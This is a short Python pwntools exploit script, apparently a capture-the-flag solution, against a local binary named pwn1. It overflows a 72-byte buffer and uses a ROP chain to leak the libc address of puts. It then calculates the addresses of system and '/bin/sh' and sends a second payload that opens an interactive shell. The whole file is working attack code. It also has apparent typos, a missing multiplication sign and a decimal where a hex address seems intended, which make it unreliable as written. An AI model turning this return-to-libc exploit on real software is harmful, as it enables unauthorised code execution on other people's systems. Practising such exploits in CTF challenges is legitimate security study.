from pwn import *
#context.log_level='DEBUG'
p=process("./pwn1")
pause()
elf=ELF("./pwn1")
libc=ELF("./libc.so")#ELF("/lib/x86_64-linux-gnu/libc.so.6")#elf.libc
puts_plt=elf.symbols['puts']
puts_got=elf.got['puts']
log.info("[PUTS PLT ] -> "+hex(puts_plt))
log.info("[PUTS GOT ] -> "+hex(puts_got))
main=0x400698
pop_rdi=0x0000000000400783
payload = 'A'72
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

#p.recvuntil("buffer: ")
p.sendline(payload)
p.recvuntil("buffer: ")


puts=u64(p.recvline().strip().ljust(8,'\x00'))
log.info("PUTS LEAK: "+hex(puts))

base_address=puts - libc.sym['puts']
log.info("BASE: "+hex(base_address))
system = base_address + libc.sym['system']
log.info("SYSTEM: "+hex(system))
binsh=base_address + libc.search("/bin/sh").next()

payload = 'A'*72
payload += p64(400536)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()